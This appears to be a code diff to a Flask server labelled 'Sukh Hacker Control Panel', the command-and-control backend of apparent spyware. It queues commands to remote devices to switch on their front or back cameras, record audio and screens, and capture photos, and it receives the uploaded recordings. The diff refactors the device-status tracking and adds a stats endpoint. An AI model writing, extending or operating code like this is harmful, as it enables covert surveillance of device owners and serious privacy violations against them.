@@ -138,6 +138,15 @@ def camera_control():
                 commands_queue[device_id].append(command)
                 sent_count = 1
                 print(f"✅ Camera command '{command}' sent to device '{device_id}'")
+                
+                # Update device status
+                if command in ['front_camera', 'back_camera']:
+                    connected_devices[device_id]['camera_active'] = True
+                    connected_devices[device_id]['current_camera'] = command
+                elif command == 'stop_camera':
+                    connected_devices[device_id]['camera_active'] = False
+                    connected_devices[device_id]['current_camera'] = None
+                    
             else:
                 print(f"❌ Device '{device_id}' not found")
                 return jsonify({'status': 'error', 'message': 'Device not found'}), 404
@@ -146,6 +155,15 @@ def camera_control():
             for dev_id in commands_queue:
                 commands_queue[dev_id].append(command)
                 sent_count += 1
+                
+                # Update device status
+                if command in ['front_camera', 'back_camera']:
+                    connected_devices[dev_id]['camera_active'] = True
+                    connected_devices[dev_id]['current_camera'] = command
+                elif command == 'stop_camera':
+                    connected_devices[dev_id]['camera_active'] = False
+                    connected_devices[dev_id]['current_camera'] = None
+                    
             print(f"✅ Camera command '{command}' sent to all {sent_count} devices")
 
         return jsonify({
@@ -316,7 +334,7 @@ def delete_file(filename):
         print(f"❌ Delete file error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# Device registration endpoint
+# Device registration endpoint - UPDATED
 @app.route('/register_device', methods=['POST'])
 def register_device():
     try:
@@ -342,7 +360,7 @@ def register_device():
         print(f"❌ Registration error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
-# Device checks for commands
+# Device checks for commands - IMPROVED
 @app.route('/get_commands/<device_id>', methods=['GET'])
 def get_commands(device_id):
     try:
@@ -366,7 +384,7 @@ def get_commands(device_id):
         print(f"❌ Get commands error: {e}")
         return jsonify({'commands': []})
 
-# Send command to all devices
+# Send command to all devices - UPDATED
 @app.route('/send_command', methods=['POST'])
 def send_command():
     try:
@@ -387,14 +405,7 @@ def send_command():
                 print(f"✅ Command '{command}' sent to device '{device_id}'")
                 
                 # Update device status
-                if command == 'start_recording':
-                    connected_devices[device_id]['recording'] = True
-                elif command == 'stop_recording':
-                    connected_devices[device_id]['recording'] = False
-                elif command == 'start_screen_recording':
-                    connected_devices[device_id]['screen_recording'] = True
-                elif command == 'stop_screen_recording':
-                    connected_devices[device_id]['screen_recording'] = False
+                update_device_status(device_id, command)
                     
             else:
                 print(f"❌ Device '{device_id}' not found")
@@ -405,14 +416,7 @@ def send_command():
                 sent_count += 1
                 
                 # Update device status
-                if command == 'start_recording':
-                    connected_devices[dev_id]['recording'] = True
-                elif command == 'stop_recording':
-                    connected_devices[dev_id]['recording'] = False
-                elif command == 'start_screen_recording':
-                    connected_devices[dev_id]['screen_recording'] = True
-                elif command == 'stop_screen_recording':
-                    connected_devices[dev_id]['screen_recording'] = False
+                update_device_status(dev_id, command)
                     
             print(f"✅ Command '{command}' sent to all {sent_count} devices")
 
@@ -442,21 +446,8 @@ def send_command_to_device():
             commands_queue[device_id].append(command)
             print(f"✅ Command '{command}' sent to device '{device_id}'")
             
-            # Update device status for camera commands
-            if command in ['front_camera', 'back_camera']:
-                connected_devices[device_id]['camera_active'] = True
-                connected_devices[device_id]['current_camera'] = command
-            elif command == 'stop_camera':
-                connected_devices[device_id]['camera_active'] = False
-                connected_devices[device_id]['current_camera'] = None
-            elif command == 'start_recording':
-                connected_devices[device_id]['recording'] = True
-            elif command == 'stop_recording':
-                connected_devices[device_id]['recording'] = False
-            elif command == 'start_screen_recording':
-                connected_devices[device_id]['screen_recording'] = True
-            elif command == 'stop_screen_recording':
-                connected_devices[device_id]['screen_recording'] = False
+            # Update device status
+            update_device_status(device_id, command)
             
             return jsonify({
                 'status': 'command_sent', 
@@ -472,7 +463,31 @@ def send_command_to_device():
         print(f"❌ Send command error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
-# Update device status
+# Helper function to update device status
+def update_device_status(device_id, command):
+    """Update device status based on command"""
+    if device_id not in connected_devices:
+        return
+        
+    if command == 'start_recording':
+        connected_devices[device_id]['recording'] = True
+    elif command == 'stop_recording':
+        connected_devices[device_id]['recording'] = False
+    elif command == 'start_screen_recording':
+        connected_devices[device_id]['screen_recording'] = True
+    elif command == 'stop_screen_recording':
+        connected_devices[device_id]['screen_recording'] = False
+    elif command in ['front_camera', 'back_camera']:
+        connected_devices[device_id]['camera_active'] = True
+        connected_devices[device_id]['current_camera'] = command
+    elif command == 'stop_camera':
+        connected_devices[device_id]['camera_active'] = False
+        connected_devices[device_id]['current_camera'] = None
+    elif command == 'capture_photo':
+        # For photo capture, we don't change camera status
+        pass
+
+# Update device status endpoint - IMPROVED
 @app.route('/update_status', methods=['POST'])
 def update_status():
     try:
@@ -499,7 +514,7 @@ def update_status():
         print(f"❌ Update status error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
-# Get connected devices
+# Get connected devices - IMPROVED
 @app.route('/get_devices', methods=['GET'])
 def get_devices():
     try:
@@ -534,6 +549,17 @@ def test():
         'uploaded_files': len(uploaded_files)
     })
 
+# Get server stats
+@app.route('/stats', methods=['GET'])
+def get_stats():
+    return jsonify({
+        'status': 'success',
+        'connected_devices': len(connected_devices),
+        'uploaded_files': len(uploaded_files),
+        'commands_pending': sum(len(q) for q in commands_queue.values()),
+        'server_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    })
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
     print(f'🚀 Starting Sukh Hacker Control Panel...')
@@ -546,6 +572,7 @@ if __name__ == '__main__':
     print('   - GET  /')
     print('   - GET  /login')
     print('   - GET  /test')
+    print('   - GET  /stats')
     print('   - POST /camera (camera control)')
     print('   - POST /data (audio upload)')
     print('   - POST /upload_photo (photo upload)')
